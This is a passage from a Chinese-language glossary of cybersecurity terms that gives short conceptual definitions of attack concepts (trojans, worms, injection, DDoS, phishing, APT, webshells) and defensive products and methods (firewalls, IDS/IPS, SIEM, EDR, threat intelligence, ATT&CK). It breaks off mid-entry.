有很多黑客就是热衷使用木马程序来控制别人的电脑，比如灰鸽子、Gh0st、PcShare等等。\n网页木马​    表面上伪装成普通的网页或是将恶意代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或者浏览器的漏洞自动将配置好的木马服务端植入到访问者的电脑上来自动执行将受影响的客户电脑变成肉鸡或纳入僵尸网络。\nRootkit​    Rootkit是攻击者用来隐藏自己的行踪和保留root（根权限，可以理解成WINDOWS下的system或者管理员权限）访问权限的工具。​    通常，攻击者通过远程攻击的方式获得root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过对方系统存在的安全漏洞获得系统的root或system权限。​    然后，攻击者就会在对方的系统中安装Rootkit，以达到自己长久控制对方的目的，Rootkit功能上与木马和后门很类似，但远比它们要隐蔽。\n蠕虫病毒​    它是一类相对独立的恶意代码，利用了联网系统的开放性特点，通过可远程利用的漏洞自主地进行传播，受到控制终端会变成攻击的发起方，尝试感染更多的系统。​    蠕虫病毒的主要特性有：自我复制能力、很强的传播性、潜伏性、特定的触发性、很大的破坏性。\n震网病毒​    又名Stuxnet病毒，是第一个专门定向攻击真实世界中基础（能源）设施的“蠕虫”病毒，比如核电站，水坝，国家电网。​    作为世界上首个网络“超级破坏性武器”，Stuxnet的计算机病毒已经感染了全球超过 45000个网络，其目标伊朗的铀浓缩设备遭到的攻击最为严重。\n勒索病毒​    主要以邮件、程序木马、网页挂马的形式进行传播。该病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。\n挖矿木马​    一种将PC、移动设备甚至服务器变为矿机的木马，通常由挖矿团伙植入，用于挖掘比特币从而赚取利益。\n攻击载荷​    攻击载荷（Payload）是系统被攻陷后执行的多阶段恶意代码。​    通常攻击载荷附加于漏洞攻击模块之上，随漏洞攻击一起分发，并可能通过网络获取更多的组件。\n嗅探器（Sniffer）​    就是能够捕获网络报文的设备或程序。嗅探器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。\n恶意软件​    被设计来达到非授权控制计算机或窃取计算机数据等多种恶意行为的程序。\n间谍软件​    一种能够在用户不知情的情况下，在其电脑、手机上安装后门，具备收集用户信息、监听、偷拍等功能的软件。\n后门​    这是一种形象的比喻，入侵者在利用某些方法成功的控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置，用于访问、查看或者控制这台主机。\n​    这些改动表面上是很难被察觉的，就好象是入侵者偷偷的配了一把主人房间的钥匙，或者在不起眼处修了一条按到，可以方便自身随意进出。\n​    通常大多数木马程序都可以被入侵者用于创建后门（BackDoor）。\n弱口令​    指那些强度不够，容易被猜解的，类似123，abc这样的口令（密码）。\n漏洞​    漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统。​    奇安信集团董事长齐向东在《漏洞》一书中指出，软件的缺陷是漏洞的一个主要来源，缺陷是天生的，漏洞是不可避免的。\n远程命令执行漏洞​    由于系统设计实现上存在的漏洞，攻击者可能通过发送特定的请求或数据导致在受影响的系统上执行攻击者指定的任意命令。\n0day漏洞​    0day漏洞最早的破解是专门针对软件的，叫做WAREZ，后来才发展到游戏，音乐，影视等其他内容的。​    0day中的0表示Zero，早期的0day表示在软件发行后的24小时内就出现破解版本。​    在网络攻防的语境下，0day漏洞指那些已经被攻击者发现掌握并开始利用，但还没有被包括受影响软件厂商在内的公众所知的漏洞，这类漏洞对攻击者来说有完全的信息优势，由于没有漏洞的对应的补丁或临时解决方案，防守方不知道如何防御，攻击者可以达成最大可能的威胁。\n1day漏洞​    指漏洞信息已公开但仍未发布补丁的漏洞。此类漏洞的危害仍然较高，但往往官方会公布部分缓解措施，如关闭部分端口或者服务等。\nNday漏洞​    指已经发布官方补丁的漏洞。通常情况下，此类漏洞的防护只需更新补丁即可，但由于多种原因，导致往往存在大量设备漏洞补丁更新不及时，且漏洞利用方式已经在互联网公开，往往此类漏洞是黑客最常使用的漏洞。​    例如在永恒之蓝事件中，微软事先已经发布补丁，但仍有大量用户中招。\n2．攻击方法挂马​    就是在别人的网站文件里面放入网页木马或者是将代码潜入到对方正常的网页文件里，以使浏览者中马。\n挖洞​    指漏洞挖掘。\n加壳​    就是利用特殊的算法，将EXE可执行程序或者DLL动态连接库文件的编码进行改变（比如实现压缩、加密），以达到缩小文件体积或者加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX，ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等等。\n溢出​    简单的解释就是程序对输入数据没有执行有效的边界检测而导致错误，后果可能是造成程序崩溃或者是执行攻击者的命令。\n缓冲区溢出​    攻击者向一个地址区输入这个区间存储不下的大量字符。在某些情况下，这些多余的字符可以作为“执行代码”来运行，因此足以使攻击者不受安全措施限制而获得计算机的控制权。\n注入​    Web安全头号大敌。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。​    注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。注入漏洞通常能在SQL查询、LDAP查询、OS命令、程序参数等中出现。\nSQL注入​    注入攻击最常见的形式，主要是指Web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在Web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询或其他操作，导致数据库信息泄露或非授权操作数据表。\n注入点​    即可以实行注入的地方，通常是一个涉及访问数据库的应用链接。根据注入点数据库的运行帐号的权限的不同，你所得到的权限也不同。\n软件脱壳​    顾名思义，就是利用相应的工具，把在软件“外面”起保护作用的“壳”程序去除，还文件本来面目，这样再修改文件内容或进行分析检测就容易多了。\n免杀​    就是通过加壳、加密、修改特征码、加花指令等等技术来修改程序，使其逃过杀毒软件的查杀。\n暴力破解​    简称“爆破”。黑客对系统中账号的每一个可能的密码进行高度密集的自动搜索，从而破坏安全并获得对计算机的访问权限。\n洪水攻击​    是黑客比较常用的一种攻击技术，特点是实施简单，威力巨大，大多是无视防御的。​    从定义上说，攻击者对网络资源发送过量数据时就发生了洪水攻击，这个网络资源可以是router，switch，host，application等。​    洪水攻击将攻击流量比作成洪水，只要攻击流量足够大，就可以将防御手段打穿。​    DDoS攻击便是洪水攻击的一种。\nSYN攻击​    利用操作系统TCP协调设计上的问题执行的拒绝服务攻击，涉及TCP建立连接时三次握手的设计。\nDoS攻击​    拒绝服务攻击。攻击者通过利用漏洞或发送大量的请求导致攻击对象无法访问网络或者网站无法被访问。\nDDoS​    分布式DOS攻击，常见的UDP、SYN、反射放大攻击等等，就是通过许多台肉鸡一起向你发送一些网络请求信息，导致你的网络堵塞而不能正常上网。\n抓鸡​    即设法控制电脑，将其沦为肉鸡。\n端口扫描​    端口扫描是指发送一组端口扫描消息，通过它了解到从哪里可探寻到攻击弱点，并了解其提供的计算机网络服务类型，试图以此侵入某台计算机。\n花指令​    通过加入不影响程序功能的多余汇编指令，使得杀毒软件不能正常的判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来识别病毒。如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了”。\n反弹端口​    有人发现，防火墙对于连入的连接往往会进行非常严格的过滤，但是对于连出的连接却疏于防范。​    于是，利用这一特性，反弹端口型软件的服务端(被控制端)会主动连接客户端(控制端)，就给人“被控制端主动连接控制端的假象，让人麻痹大意。\n网络钓鱼​    攻击者利用欺骗性的电子邮件或伪造的Web 站点等来进行网络诈骗活动。​    诈骗者通常会将自己伪装成网络银行、在线零售商和信用卡公司等可信的品牌，骗取用户的私人信息或邮件账号口令。​    受骗者往往会泄露自己的邮箱、私人资料，如信用卡号、银行卡账户、身份证号等内容。\n鱼叉攻击​    鱼叉攻击是将用鱼叉捕鱼形象的引入到了网络攻击中，主要是指可以使欺骗性电子邮件看起来更加可信的网络钓鱼攻击，具有更高的成功可能性。​    不同于撒网式的网络钓鱼，鱼叉攻击往往更加具备针对性，攻击者往往“见鱼而使叉”。​    为了实现这一目标，攻击者将尝试在目标上收集尽可能多的信息。通常，组织内的特定个人存在某些安全漏洞。\n钓鲸攻击​    捕鲸是另一种进化形式的鱼叉式网络钓鱼。它指的是针对高级管理人员和组织内其他高级人员的网络钓鱼攻击。​    通过使电子邮件内容具有个性化并专门针对相关目标进行定制的攻击。\n水坑攻击​    顾名思义，是在受害者必经之路设置了一个“水坑(陷阱)”。​    最常见的做法是，黑客分析攻击目标的上网活动规律，寻找攻击目标经常访问的网站的弱点，先将此网站“攻破”并植入攻击代码，一旦攻击目标访问该网站就会“中招”。\n嗅探​    嗅探指的是对局域网中的数据包进行截取及分析，从中获取有效信息。\nAPT攻击​    Advanced Persistent Threat，即高级可持续威胁攻击，指某组织在网络上对特定对象展开的持续有效的攻击活动。​    这种攻击活动具有极强的隐蔽性和针对性，通常会运用受感染的各种介质、供应链和社会工程学等多种手段实施先进的、持久的且有效的威胁和攻击。\nC2​    C2 全称为Command and Control，命令与控制，常见于APT攻击场景中。作动词解释时理解为恶意软件与攻击者进行交互，作名词解释时理解为攻击者的“基础设施”。\n供应链攻击​    是黑客攻击目标机构的合作伙伴，并以该合作伙为跳板，达到渗透目标用户的目的。​    一种常见的表现形式为，用户对厂商产品的信任，在厂商产品下载安装或者更新时进行恶意软件植入进行攻击。​    所以，在某些软件下载平台下载的时候，若遭遇捆绑软件，就得小心了！\n社会工程学​    一种无需依托任何黑客软件，更注重研究人性弱点的黑客手法正在兴起，这就是社会工程学黑客技术。​    通俗而言是指利用人的社会学弱点实施网络攻击的一整套方法论，其攻击手法往往出乎人意料。​    世界第一黑客凯文·米特尼克在《反欺骗的艺术》中曾提到，人为因素才是安全的软肋。很多企业、公司在信息安全上投入大量的资金，最终导致数据泄露的原因，往往却是发生在人本身。\n拿站​    指得到一个网站的最高权限，即得到后台和管理员名字和密码。\n提权​    指得到你本没得到的权限，比如说电脑中非系统管理员就无法访问一些C盘的东西，而系统管理员就可以，通过一定的手段让普通用户提升成为管理员，让其拥有管理员的权限，这就叫提权。\n渗透​    就是通过扫描检测你的网络设备及系统有没有安全漏洞，有的话就可能被入侵，就像一滴水透过一块有漏洞的木板，渗透成功就是系统被入侵。\n横移​    指攻击者入侵后，从立足点在内部网络进行拓展，搜寻控制更多的系统。\n跳板​    一个具有辅助作用的机器，利用这个主机作为一个间接工具，来入侵其他主机，一般和肉鸡连用。\n网马​    就是在网页中植入木马，当打开网页的时候就运行了木马程序。\n黑页​    黑客攻击成功后，在网站上留下的黑客入侵成功的页面，用于炫耀攻击成果。\n暗链​    看不见的网站链接，“暗链”在网站中的链接做得非常隐蔽，短时间内不易被搜索引擎察觉。​    它和友情链接有相似之处，可以有效地提高网站权重。\n拖库​    拖库本来是数据库领域的术语，指从数据库中导出数据。​    在网络攻击领域，它被用来指网站遭到入侵后，黑客窃取其数据库文件。\n撞库​    撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。​    很多用户在不同网站使用的是相同的帐号密码，因此黑客可以通过获取用户在A网站的账户从而尝试登录B网址，这就可以理解为撞库攻击。\n暴库​    入侵网站的一种手法，通过恶意代码让网站爆出其一些敏感数据来。\nCC攻击​    即Challenge Collapsar，名字来源于对抗国内安全厂商绿盟科技早期的抗拒绝服务产品黑洞，攻击者借助代理服务器生成指向受害主机的涉及大量占用系统资源的合法请求，耗尽目标的处理资源，达到拒绝服务的目的。\nWebshell​    Webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做是一种网页后门，可以上传下载文件，查看数据库，执行任意程序命令等。\n跨站攻击​    通常简称为XSS，是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。\n中间人攻击​    中间人攻击是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而这台计算机就称为“中间人”。\n薅羊毛​    指网赚一族利用各种网络金融产品或红包活动推广下线抽成赚钱，又泛指搜集各个银行等金融机构及各类商家的优惠信息，以此实现盈利的目的。这类行为就被称之为薅羊毛。\n商业电子邮件攻击（BEC）​    也被称为“变脸诈骗”攻击，这是针对高层管理人员的攻击，攻击者通常冒充（盗用）决策者的邮件，来下达与资金、利益相关的指令；或者攻击者依赖社会工程学制作电子邮件，说服&#x2F;诱导高管短时间进行经济交易。\n电信诈骗​    是指通过电话、网络和短信方式，编造虚假信息，设置骗局，对受害人实施远程、非接触式诈骗，诱使受害人打款或转账的犯罪行为，通常以冒充他人及仿冒、伪造各种合法外衣和形式的方式达到欺骗的目的。\n杀猪盘​    网络流行词，电信诈骗的一种，是一种网络交友诱导股票投资、赌博等类型的诈骗方式，“杀猪盘”则是“从业者们”自己起的名字，是指放长线“养猪”诈骗，养得越久，诈骗得越狠。\nARP攻击​    ARP协议的基本功能就是通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信的进行。​    基于ARP协议的这一工作特性，黑客向对方计算机不断发送有欺诈性质的ARP数据包，数据包内包含有与当前设备重复的Mac地址，使对方在回应报文时，由于简单的地址重复错误而导致不能进行正常的网络通信。\n欺骗攻击​    网络欺骗的技术主要有：HONEYPOT和分布式HONEYPOT、欺骗空间技术等。​    主要方式有：IP欺骗、ARP欺骗、 DNS欺骗、Web欺骗、电子邮件欺骗、源路由欺骗（通过指定路由，以假冒身份与其他主机进行合法通信或发送假报文，使受攻击主机出现错误动作）、地址欺骗（包括伪造源地址和伪造中间站点）等。\nShellcode​    一段可被操作系统无需特别定位处理的指令，通常在利用软件漏洞后执行的恶意代码，shellcode为二进制的机器码，因为经常让攻击者获得shell而得名。\n物理攻击​    通俗理解，即采用物理接触而非技术手段达到网络入侵的目的，最常见的表现形式为插U盘。​    著名的震网病毒事件即通过插U盘的形式，感染了伊朗核设施。\n3．攻击者黑产​    网络黑产，指以互联网为媒介，以网络技术为主要手段，为计算机信息系统安全和网络空间管理秩序，甚至国家安全、社会政治稳定带来潜在威胁（重大安全隐患）的非法行为。​    例如非法数据交易产业。\n暗网​    暗网是利用加密传输、P2P对等网络、多点中继混淆等，为用户提供匿名的互联网信息访问的一类技术手段，其最突出的特点就是匿名性。\n黑帽黑客​    以非法目的进行黑客攻击的人，通常是为了经济利益。他们进入安全网络以销毁、赎回、修改或窃取数据，或使网络无法用于授权用户。​    这个名字来源于这样一个历史：老式的黑白西部电影中，恶棍很容易被电影观众识别，因为他们戴着黑帽子，而“好人”则戴着白帽子。\n白帽黑客​    是那些用自己的黑客技术来进行合法的安全测试分析的黑客，测试网络和系统的性能来判定它们能够承受入侵的强弱程度。\n红帽黑客​    事实上最为人所接受的说法叫红客。​    红帽黑客以正义、道德、进步、强大为宗旨，以热爱祖国、坚持正义、开拓进取为精神支柱，红客通常会利用自己掌握的技术去维护国内网络的安全，并对外来的进攻进行还击。\n红队​    通常指攻防演*中的攻击队伍。\n蓝队​    通常指攻防演*中的防守队伍。\n紫队​    攻防演中新诞生的一方，通常指监理方或者裁判方。\n\n二、防守篇1．软硬件加密机主机加密设备，加密机和主机之间使用TCP&#x2F;IP协议通信，所以加密机对主机的类型和主机操作系统无任何特殊的要求。\nCA证书为实现双方安全通信提供了电子认证。在因特网、公司内部网或外部网中，使用数字证书实现身份识别和电子信息加密。数字证书中含有密钥对（公钥和私钥）所有者的识别信息，通过验证识别信息的真伪实现对证书持有者身份的认证。\nSSL证书SSL证书是数字证书的一种，类似于驾驶证、护照和营业执照的电子副本。因为配置在服务器上，也称为SSL服务器证书。\n防火墙主要部署于不同网络或网络安全域之间的出口，通过监测、限制、更改跨越防火墙的数据流，尽可能地对外部屏蔽网络内部的信息、结构和运行状况，有选择地接受外部访问。\nIDS入侵检测系统，用于在黑客发起进攻或是发起进攻之前检测到攻击，并加以拦截。IDS是不同于防火墙。防火墙只能屏蔽入侵，而IDS却可以在入侵发生以前，通过一些信息来检测到即将发生的攻击或是入侵并作出反应。\nNIDS是Network Intrusion Detection System的缩写，即网络入侵检测系统，主要用于检测Hacker或Cracker 。通过网络进行的入侵行为。NIDS的运行方式有两种，一种是在目标主机上运行以监测其本身的通信信息，另一种是在一台单独的机器上运行以监测所有网络设备的通信信息，比如Hub、路由器。\nIPS全称为Intrusion-Prevention System，即入侵防御系统，目的在于及时识别攻击程序或有害代码及其克隆和变种，采取预防措施，先期阻止入侵，防患于未然。或者至少使其危害性充分降低。入侵预防系统一般作为防火墙 和防病毒软件的补充来投入使用。\n杀毒软件也称反病毒软件或防毒软件，是用于消除电脑病毒、特洛伊木马和恶意软件等计算机威胁的一类软件。\n反病毒引擎通俗理解，就是一套判断特定程序行为是否为病毒程序（包括可疑的）的技术机制。例如奇安信自主研发的QOWL猫头鹰反病毒引擎。\n防毒墙区别于部署在主机上的杀毒软件，防毒墙的部署方式与防火墙类似，主要部署于网络出口，用于对病毒进行扫描和拦截，因此防毒墙也被称为反病毒网关。\n老三样通常指IDS、防火墙和反病毒三样历史最悠久安全产品。\n告警指网络安全设备对攻击行为产生的警报。\n误报也称为无效告警，通常指告警错误，即把合法行为判断成非法行为而产生了告警。目前，由于攻击技术的快速进步和检测技术的限制，误报的数量非常大，使得安全人员不得不花费大量时间来处理此类告警，已经成为困扰并拉低日常安全处置效率的主要原因。\n漏报通常指网络安全设备没有检测出非法行为而没有产生告警。一旦出现漏报，将大幅增加系统被入侵的风险。\nNAC全称为Network Access Control，即网络准入控制，其宗旨是防止病毒和蠕虫等新兴黑客技术对企业安全造成危害。借助NAC，客户可以只允许合法的、值得信任的终端设备（例如PC、服务器、PDA）接入网络，而不允许其它设备接入。\n漏扫即漏洞扫描，指基于漏洞数据库，通过扫描等手段对指定的远程或者本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测（渗透攻击）行为。\nUTM即Unified Threat Management，中文名为统一威胁管理，最早由IDC于2014年提出，即将不同设备的安全能力（最早包括入侵检测、防火墙和反病毒技术），集中在同一网关上，实现统一管理和运维。\n网闸网闸是使用带有多种控制功能的固态开关读写介质，连接两个独立主机系统的信息安全设备。由于两个独立的主机系统通过网闸进行隔离，只有以数据文件形式进行的无协议摆渡。\n堡垒机运用各种技术手段监控和记录运维人员对网络内的服务器、网络设备、安全设备、数据库等设备的操作行为，以便集中报警、及时处理及审计定责。\n数据库审计能够实时记录网络上的数据库活动，对数据库操作进行细粒度审计的合规性管理，对数据库遭受到的风险行为进行告警，对攻击行为进行阻断。它通过对用户访问数据库行为的记录、分析和汇报，用来帮助用户事后生成合规报告、事故追根溯源，同时加强内外部数据库网络行为记录，提高数据资产安全。\nDLP数据防泄漏，通过数字资产的精准识别和策略制定，主要用于防止企业的指定数据或信息资产以违反安全策略规定的形式流出企业。\nVPN虚拟专用网，在公用网络上建立专用网络，进行加密通讯，通过对数据包的加密和数据包目标地址的转换实现远程访问。\nSD-WAN即软件定义广域网，这种服务用于连接广阔地理范围的企业网络、数据中心、互联网应用及云服务。这种服务的典型特征是将网络控制能力通过软件方式云化。通常情况下，SD-WAN都集成有防火墙、入侵检测或者防病毒能力。并且从目前的趋势来看，以安全为核心设计的SD-WAN正在崭露头角，包括奇安信、Fortinet等多家安全厂商开始涉足该领域，并提供了较为完备的内生安全设计。\n路由器是用来连接不同子网的中枢，它们工作于OSI7层模型的传输层和网络层。路由器的基本功能就是将网络信息包传输到它们的目的地。一些路由器还有访问控制列表（ACLs），允许将不想要的信息包过滤出去。许多路由器都可以将它们的日志信息注入到IDS系统中，并且自带基础的包过滤（即防火墙）功能。\n网关通常指路由器、防火墙、IDS、VPN等边界网络设备。\nWAF即Web Application Firewall，即Web应用防火墙，是通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为Web应用提供保护的一款产品。\nSOC即Security Operations Center，翻译为安全运行中心或者安全管理平台，通过建立一套实时的资产风险模型，协助管理员进行事件分析、风险分析、预警管理和应急响应处理的集中安全管理系统。\nLAS日志审计系统，主要功能是提供日志的收集、检索和分析能力，可为威胁检测提供丰富的上下文。\nNOC即Network Operations Center，网络操作中心或网络运行中心，是远程网络通讯的管理、监视和维护中心，是网络问题解决、软件分发和修改、路由、域名管理、性能监视的焦点。\nSIEM即Security Information and Event Management，安全信息和事件管理，负责从大量企业安全控件、主机操作系统、企业应用和企业使用的其他软件收集安全日志数据，并进行分析和报告。\n上网行为管理是指帮助互联网用户控制和管理对互联网使用的设备。其包括对网页访问过滤、上网隐私保护、网络应用控制、带宽流量管理、信息收发审计、用户行为分析等。\n蜜罐（Honeypot）是一个包含漏洞的系统，它摸拟一个或多个易受攻击的主机，给黑客提供一个容易攻击的目标。由于蜜罐没有其它任务需要完成，因此所有连接的尝试都应被视为是可疑的。蜜罐的另一个用途是拖延攻击者对其真正目标的攻击，让攻击者在蜜罐上浪费时间。蜜罐类产品包括蜜网、蜜系统、蜜账号等等。\n沙箱沙箱是一种用于安全的运行程序的机制。它常常用来执行那些非可信的程序。非可信程序中的恶意代码对系统的影响将会被限制在沙箱内而不会影响到系统的其它部分。\n沙箱逃逸一种识别沙箱环境，并利用静默、欺骗等技术，绕过沙箱检测的现象\n网络靶场主要是指通过虚拟环境与真实设备相结合，模拟仿真出真实赛博网络空间攻防作战环境，能够支撑攻防演练、安全教育、网络空间作战能力研究和网络武器装备验证试验平台。\n2．技术与服务加密技术加密技术包括两个元素：算法和密钥。算法是将普通的文本与一串数字（密钥）的结合，产生不可理解的密文的步骤，密钥是用来对数据进行编码和解码的一种算法。密钥加密技术的密码体制分为对称密钥体制和非对称密钥体制两种。相应地，对数据加密的技术分为两类，即对称加密（私人密钥加密）和非对称加密（公开密钥加密）。对称加密的加密密钥和解密密钥相同，而非对称加密的加密密钥和解密密钥不同，加密密钥可以公开而解密密钥需要保密。\n黑名单顾名思义，黑名单即不好的名单，凡是在黑名单上的软件、IP地址等，都被认为是非法的。\n白名单与黑名单对应，白名单即“好人”的名单，凡是在白名单上的软件、IP等，都被认为是合法的，可以在计算机上运行。\n内网通俗的讲就是局域网，比如网吧、校园网、公司内部网等都属于此类。查看IP地址，如果是在以下三个范围之内，就说明我们是处于内网之中的：10.0.0.0—10.255.255.255，172.16.0.0—172.31.255.255，192.168.0.0—192.168.255.255\n外网直接连入INTERNET（互连网），可以与互连网上的任意一台电脑互相访问。\n边界防御以网络边界为核心的防御模型，以静态规则匹配为基础，强调把所有的安全威胁都挡在外网。\n南北向流量通常指数据中心内外部通信所产生的的流量。\n东西向流量通常指数据中心内部不同主机之间互相通信所产生的的流量。\n规则库网络安全的核心数据库，类似于黑白名单，用于存储大量安全规则，一旦访问行为和规则库完成匹配，则被认为是非法行为。所以有人也将规则库比喻为网络空间的法律。\n下一代网络安全领域经常用到，用于表示产品或者技术有较大幅度的创新，在能力上相对于传统方法有明显的进步，通常缩写为NG（Next Gen）。例如NGFW（下一代防火墙）、NGSOC（下一代安全管理平台）等。\n大数据安全分析区别于传统被动规则匹配的防御模式，以主动收集和分析大数据的方法，找出其中可能存在的安全威胁，因此也称数据驱动安全。该理论最早由奇安信于2015年提出。\nEPP全称为Endpoint Protection Platform，翻译为端点保护平台，部署在终端设备上的安全防护解决方案,用于防止针对终端的恶意软件、恶意脚本等安全威胁，通常与EDR进行联动。\nEDR全称Endpoint Detection &amp; Response，即端点检测与响应，通过对端点进行持续检测，同时通过应用程序对操作系统调用等异常行为分析，检测和防护未知威胁，最终达到杀毒软件无法解决未知威胁的目的。\nNDR全称Network Detection &amp; Response，即网络检测与响应，通过对网络侧流量的持续检测和分析，帮助企业增强威胁响应能力，提高网络安全的可见性和威胁免疫力。\n安全可视化指在网络安全领域中的呈现技术，将网络安全加固、检测、防御、响应等过程中的数据和结果转换成图形界面，并通过人机交互的方式进行搜索、加工、汇总等操作的理论、方法和技术。\nNTA网络流量分析（NTA）的概念是Gartner于2013年首次提出的，位列五种检测高级威胁的手段之一。它融合了传统的基于规则的检测技术，以及机器学*和其他高级分析技术，用以检测企业网络中的可疑行为，尤其是失陷后的痕迹。\nMDR全称Managed Detection &amp; Response，即托管检测与响应，依靠基于网络和主机的检测工具来识别恶意模式。此外，这些工具通常还会从防火墙之内的终端收集数据，以便更全面地监控网络活动。\n应急响应通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。\nXDR通常指以检测和响应技术为核心的网络安全策略的统称，包括EDR、NDR、MDR等。\n安全运营贯穿产品研发、业务运行、漏洞修复、防护与检测、应急响应等一系列环节，实行系统的管理方法和流程，将各个环节的安全防控作用有机结合，保障整个业务的安全性。\n威胁情报根据Gartner的定义，威胁情报是某种基于证据的知识，包括上下文、机制、标示、含义和能够执行的建议，这些知识与资产所面临已有的或酝酿中的威胁或危害相关，可用于资产相关主体对威胁或危害的响应或处理决策提供信息支持。根据使用对象的不同，威胁情报主要分为人读情报和机读情报。\nTTP主要包括三要素，战术Tactics、技术Techniques和过程Procedures，是描述高级威胁组织及其攻击的重要指标，作为威胁情报的一种重要组成部分，TTP可为安全分析人员提供决策支撑。\nIOC中文名为失陷标示：用以发现内部被APT团伙、木马后门、僵尸网络控制的失陷主机，类型上往往是域名、URL等。目前而言，IOC是应用最为广泛的威胁情报，因为其效果最为直接。一经匹配，则意味着存在已经失陷的主机。\n上下文从文章的上下文引申而来，主要是指某项威胁指标的关联信息，用于实现更加精准的安全匹配和检测。\nSTIXSTIX是一种描述网络威胁信息的结构化语言，能够以标准化和结构化的方式获取更广泛的网络威胁信息，常用于威胁情报的共享与交换，目前在全球范围内使用最为广泛。STIX在定义了8中构件的1.0版本基础上，已经推出了定义了12中构件的2.0版本。\n杀伤链杀伤链最早来源于军事领域，用于描述进攻一方各个阶段的状态。在网络安全领域，这一概念最早由洛克希德-马丁公司提出，英文名称为Kill Chain，也称作网络攻击生命周期，包括侦查追踪、武器构建、载荷投递、漏洞利用、安装植入、命令控制、目标达成等七个阶段，来识别和防止入侵。\nATT&amp;CK可以简单理解为描述攻击者技战术的知识库。MITRE在2013年推出了该模型，它是根据真实的观察数据来描述和分类对抗行为。ATT&amp;CK将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式（STIX）、指标信息的可信自动化交换（TAXII）来表示。\n钻石模型钻石模型在各个领域的应用都十分广泛，在网络安全领域，钻石模型首次建立了一种将科学原理应用于入侵分析的正式方法：可衡量、可测试和可重复——提供了一个对攻击活动进行记录、(信息)合成、关联的简单、正式和全面的方法。这种科学的方法和简单性可以改善分析的效率、效能和准确性。\n关联分析又称关联挖掘，就是在交易数据、关系数据或其他信息载体中，查找存在于项目集合或对象集合之间的频繁模式、关联、相关性或因果结构。在网络安全领域主要是指将不同维度、类型的安全数据进行关联挖掘，找出其中潜在的入侵行为。\n态势感知是一种基于环境的、动态、整体地洞悉安全风险的能力，是以安全大数据为基础，从全局视角提升对安全威胁的发现识别、理解分析、响应处置能力的一种方式，最终是为了决策与行动，是安全能力的落地。\n探针也叫作网络安全探针或者安全探针，可以简单理解为赛博世界的摄像头，部署在网络拓扑的关键节点上，用于收集和分析流量和日志，发现异常行为，并对可能到来的攻击发出预警。\n网络空间测绘用搜索引擎技术来提供交互，让人们可以方便的搜索到网络空间上的设备。相对于现实中使用的地图，用各种测绘方法描述和标注地理位置，用主动或被动探测的方法，来绘制网络空间上设备的网络节点和网络连接关系图，及各设备的画像。\nSOAR全称Security Orchestration, Automation and Response，意即安全编排自动化与响应，主要通过剧本化、流程化的指令，对入侵行为采取的一系列自动化或者半自动化响应处置动作。\nUEBA全称为User and Entity Behavior Analytics，即用户实体行为分析，一般通过大数据分析的方法，分析用户以及IT实体的行为，从而判断是否存在非法行为。\n内存保护内存保护是操作系统对电脑上的内存进行访问权限管理的一个机制。内存保护的主要目的是防止某个进程去访问不是操作系统配置给它的寻址空间。\nRASP全称为Runtime application self-protection，翻译成应用运行时自我保护。在2014年时由Gartner提出，它是一种新型应用安全保护技术，它将保护程序像疫苗一样注入到应用程序中，应用程序融为一体，能实时检测和阻断安全攻击，使应用程序具备自我保护能力，当应用程序遭受到实际攻击伤害，就可以自动对其进行防御，而不需要进行人工干预。\n包检测对于流量包、数据包进行拆包、检测的行为。\n深度包检测Deep Packet Inspection，缩写为 DPI，又称完全数据包探测（complete packet inspection）或信息萃取（Information eXtraction，IX），是一种计算机网络数据包过滤技术，用来检查通过检测点之数据包的数据部分（亦可能包含其标头），以搜索不匹配规范之协议、病毒、垃圾邮件、入侵迹象。\n全流量检测全流量主要体现在三个“全”上，即全流量采集与保存，全行为分析以及全流量回溯。通过全流量分析设备，实现网络全流量采集与保存、全行为分析与全流量回溯，并提取网络元数据上传到大数据分析平台实现更加丰富的功能。\n元数据元数据（Metadata），又称中介数据、中继数据，为描述数据的数据（data about 